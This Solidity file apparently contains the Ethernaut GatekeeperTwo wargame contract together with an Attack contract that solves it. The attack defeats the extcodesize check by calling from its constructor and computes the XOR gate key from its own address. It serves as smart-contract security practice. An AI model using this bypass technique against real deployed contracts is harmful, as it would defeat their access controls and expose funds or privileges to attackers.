// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract Attack {
    uint256 public codesize;

    constructor(address target) {
        uint64 three = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        bytes8 gateKey = convertBytesToBytes8(abi.encodePacked(three));
        GatekeeperTwo(target).enter(gateKey);
        // codesize = GatekeeperTwo(target).gatetwo();
    }

    function convertBytesToBytes8(bytes memory inBytes) public pure returns (bytes8 outBytes8) {
        if (inBytes.length == 0) {
            return 0x0;
        }

        assembly {
            outBytes8 := mload(add(inBytes, 32))
        }
    }
}